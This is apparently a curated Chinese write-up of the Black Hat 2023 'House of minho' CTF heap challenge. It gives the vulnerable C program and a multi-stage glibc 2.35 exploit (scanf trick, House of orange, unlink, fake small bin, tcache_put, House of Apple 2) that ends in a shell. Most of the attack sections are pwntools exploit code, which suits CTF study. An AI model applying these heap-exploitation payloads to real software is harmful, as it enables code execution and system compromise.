---
title: Black Hat 2023 Pwn House of minho 0解详解
contest: Black Hat
year: 2023
difficulty: hard
vuln_type: heap_exploit
tags: [glibc 2.35, scanf trick, House of orange, unlink, small bin, tcache_put, House of Apple 2]
attack_chain: |
  1. 题目漏洞: 单 g_buf + new/show/delete, malloc(0x40) 时 read 写 0x80 字节 → 0x40 字节溢出
  2. libc 2.35 限制: tcache bin count 校验 + safe-linking + PROTECT_PTR + REVEAL_PTR 阻止直接 tcache poisoning
  3. 信息收集 (House of orange 改 top chunk): scanf 0xd59 个 '0' + '3' 触发 malloc(0x800)→realloc(0x1000)→realloc(0x2000)→free，污染下方 chunk 0x11 size → add(1, "a"*0x48 + p64(0xd11)) 改 top chunk size 为 0xd11 → show2(0x1000) 触发 malloc 大块让 top 进入 unsorted bin → show 泄 libc_base = leak - 0x219ce0
  4. 泄 heap: free 后 tcache bin fd 是 0 但被 REVEAL_PTR 加密为 heap_addr>>12 → show 出 heap_base = leak << 12
  5. Unlink 扩展可控: 在 0x50 chunk 内伪造 fd=bk=heap_base+0x2c0 + size 0x31 + 下 0x90 chunk size 0xd00 → 触发 unlink 让 unsorted bin 起始地址从 0xd00 变 0xd30
  6. 伪造 small bin: 在 0x80 可控范围内布置 3 个 0x90 fake chunk (bk 链串) + Chunk A 0x10 + Chunk B 0x11 防合并 → flat({0x10: 0, 0x18: 0x91, 0x20: heap+0x380, 0x28: libc+0x219ce0, ...}) + 3 个 0x90 小链
  7. tcache_put 控制: add(2, "aaaa") + free 触发 tcache_put 把 3 个 0x90 堆块塞进 tcache bin，count=3 → 此时 tcache 0x90 fd 可控
  8. House of Apple 2 收尾: 0x71 块扩容 + tcache fd 写 _IO_list_all → 申请到 _IO_list_all 上写 fake file (vtable=_IO_wfile_jumps) → exit() 触发 _IO_wfile_overflow → system(" sh;")
key_payload: |
  # scanf 长字符串污染:
  free3(0xd59)  # send "0"*0xd58 + "3" → 污染 0x11 chunk 后面的 size 为 0x33
  
  # House of orange 改 top chunk size:
  add(1, b"a"*0x48 + p64(0xd11))  # size 0xd11 + prev_inuse=1
  show2(0x1000)  # 触发 malloc(0x1000) 让 top 进入 unsorted bin
  free()
  add(1, b"a"*0x50)  # 拿到 unsorted bin 切割块
  show()  # 泄 libc_base = u64(leak) - 0x219ce0
  
  # Unlink 扩展:
  add(1, b"a"*0x10 + p64(0) + p64(0x31) + p64(heap_base+0x2c0)*2 + b"a"*0x10 + p64(0x30) + p64(0xd00))
  free()  # 触发 unlink → unsorted bin 起点 0xd00 → 0xd30
  
  # 布置 small bin 链 + Chunk AB:
  add(2, b"a"*0x50 + p64(0x90) + p64(0x10) + p64(0x00) + p64(0x11))
  free()
  add(1, flat({0x10: 0, 0x18: 0x91, 0x20: heap+0x380, 0x28: libc+0x219ce0}, filler=b"\x00"))
  show2(0x1000)  # 触发 unsorted → small bin 转换
  free()
  
  # 3 个 0x90 small bin 链:
  add(1, flat({0x10: {0x00: 0, 0x08: 0x91, 0x10: heap+0x2c0, 0x18: heap+0x2c0+0x30, 0x30: 0, 0x38: 0x91, 0x40: heap+0x2c0, 0x48: heap+0x2c0+0x50, 0x50: 0, 0x58: 0x91, 0x60: heap+0x2c0+0x30, 0x68: libc+0x219d60}}, filler=b"\x00"))
  free()
  add(2, b"aaaa")  # 命中 small bin → tcache_put 3 个 0x90 → count=3
  free()
one_liner: 单缓冲区溢出 + scanf 长输入触发 House of orange + unlink + small bin 链 + tcache_put，最后 House of Apple 2 收尾。
lesson: |
  scanf("%d", &val) 不设 setvbuf(stdin, 0) 时输入长文本会触发 malloc(0x800)→realloc(0x1000)→realloc(0x2000)→free 链，是现代 glibc 题目泄露+改 top chunk 的"金钥匙"。
  small bin 命中时会自动 tcache_put 把同 size 链上剩下的块填进 tcache，count 上限是 mp_.tcache_count (=7)，可以借此打满 count → 后续 malloc 走 tcache 路径。
  tcache_put 写入的 fd 可以被攻击者伪造（只需要小链的 bk 链正确），从而劫持 tcache fd 到任意地址。
quality: high
---

# Black Hat 2023 Pwn House of minho 0解详解

> 来源: ctfiot.com 153153 - 看雪论坛 Csome 原创

## 题目

```c
#define SIZE_SMALL 0x40
#define SIZE_BIG   0x80
char *g_buf;

int main() {
  setvbuf(stdout, NULL, _IONBF, 0);
  while (1) {
    switch (getint("> ")) {
      case 1: /* new */
        if (g_buf) break;
        g_buf = malloc(getint()==1 ? SIZE_SMALL : SIZE_BIG);
        read(STDIN_FILENO, g_buf, SIZE_BIG);   /* 固定写 0x80 字节 */
        g_buf[strcspn(g_buf, "\n")] = ' ';
        break;
      case 2: /* show */ if (g_buf) printf("Data: %s\n", g_buf); break;
      case 3: /* delete */ if (g_buf) { free(g_buf); g_buf = NULL; } break;
      default: return 0;
    }
  }
}
```

漏洞：malloc(0x40) 后 read 写 0x80 字节 → 0x40 字节溢出到下一个 chunk。
libc 2.35-3.1：带 tcache + safe-linking + PROTECT_PTR 指针保护。

## 攻击链 7 段

### 1. 漏洞但被 libc 2.35 阻挠

```python
p = malloc(0x40); free(p)
p = malloc(0x80); free(p)
p = malloc(0x40)  # 重新申请
read(0, p, 0x80)  # 溢出
free(p)
p = malloc(0x80); free(p)  # 改 size 让这次 free 不进 0x90
p = malloc(0x80)  # 2.35 这里会失败（count=0）
```

直接 tcache poisoning 已经被 2.35 堵死。

### 2. 信息收集：House of orange 改 top chunk

没有 `setvbuf(stdin, 0)` 时，scanf("%d") 内部在缓冲区不足时会触发：
```c
p = malloc(0x800); p = realloc(p, 0x1000); p = realloc(p, 0x2000); free(p);
```

发送 0xd59 个 '0' + '3'（选择 free）可以污染 0x11 chunk 后面的 size 为 0x33：
```python
def free3(len): io.sendlineafter(b"> ", b"0" * (len-1) + b"3")
free3(0xd59)
```

然后改 top chunk size 为 0xd11：
```python
add(1, b"a"*0x48 + p64(0xd11))
show2(0x1000)  # 触发 malloc(0x1000) → top 进入 unsorted bin
free()
add(1, b"a"*0x50)
show()
libc_base = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00")) - 0x219ce0
```

### 3. 泄 heap

tcache bin 的 fd 是 0，但被 REVEAL_PTR 加密为 `0 ^ (heap_addr >> 12)`，可以直接 show 出来：
```python
add(1, b"a"*0x50); show()
heap_base = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00")) << 12
```

### 4. Unlink 扩展可控距离

只有 0x80 - 0x40 = 0x40 可控空间，布置两个哨兵块 Chunk A/B 不够。在 0x50 chunk 内伪造 0x31 fake chunk 触发 unlink：

```python
add(1, b"a"*0x10 + p64(0) + p64(0x31) + p64(heap_base+0x2c0)*2 + b"a"*0x10 + p64(0x30) + p64(0xd00))
free()
add(2, b"a"*0x50 + p64(0x90) + p64(0x10) + p64(0x00) + p64(0x11))  # 哨兵 A 0x10 + B 0x11
free()
```

Unlink 之后 unsorted bin 起始地址从 0xd00 变成 0xd30，可控距离从 0x40 扩到 0x70。

### 5. 伪造 small bin

```python
add(1, flat({0x10: 0, 0x18: 0x91, 0x20: heap+0x380, 0x28: libc+0x219ce0}, filler=b"\x00"))
show2(0x1000)  # 触发 unsorted → small bin 转换
free()
```

然后布置 3 个 0x90 small bin fake chain（bk 串起来，fd 只需要让 bck->fd == victim 通过）：
```python
add(1, flat({0x10: {
    0x00: 0, 0x08: 0x91, 0x10: heap+0x2c0, 0x18: heap+0x2c0+0x30,
    0x30: 0, 0x38: 0x91, 0x40: heap+0x2c0, 0x48: heap+0x2c0+0x50,
    0x50: 0, 0x58: 0x91, 0x60: heap+0x2c0+0x30, 0x68: libc+0x219d60,
}}, filler=b"\x00"))
free()
add(2, b"aaaa")  # 命中 small bin
free()
```

malloc 命中 small bin 时会触发 `tcache_put` 把剩下 3 个 0x90 块塞进 tcache，count=3。

### 6. 控制 tcache 0x90 fd

此时 tcache 0x90 entries 的 fd 是攻击者控制的 fake chain。

### 7. House of Apple 2 收尾

```python
_IO_list_all = libc_base + 0x21a680
system = libc_base + 0x50d60
fake_file = heap_base + 0x2e0

# 0x71 块扩容 + tcache fd 写 _IO_list_all
add(1, b"a"*0x10 + p64(0) + p64(0x71) + p64((heap+0x2d0+0x70) ^ (heap>>12)))
free()

# 布置 fake file
add(2, flat({
    0x0+0x10: b" sh;",
    0x28+0x10: system,
    0x68: 0x71,
    0x70: _IO_list_all ^ (heap>>12),
}, filler=b"\x00"))
free()

add(2, flat({
    0xa0-0x60: fake_file-0x10,
    0xd0-0x60: fake_file+0x28-0x68,
    0xD8-0x60: libc_base + 0x2160C0,  # _IO_wfile_jumps
}, filler=b"\x00"))
free()

add(2, p64(fake_file))
io.sendline(b"0")  # exit → 触发 _IO_wfile_overflow → system(" sh;")
```

## 评价

**罕见的 0 解题公开讲解。** Csome 把"glibc 2.35 之后怎么打 tcache"这条路拆成 7 段：House of orange 改 top → scanf 触发 malloc/realloc/free → 泄 libc/heap → unlink 扩展可控 → small bin 链 → tcache_put 控 fd → House of Apple 2。

攻击面依赖 scanf 内部行为（`setvbuf(stdin, 0)` 缺失）+ 单缓冲区溢出，是典型现代 glibc 0 解题套路。文中大量源码引用 + 堆布局图，是研究 House of minho 系列技法的标杆级 writeup。
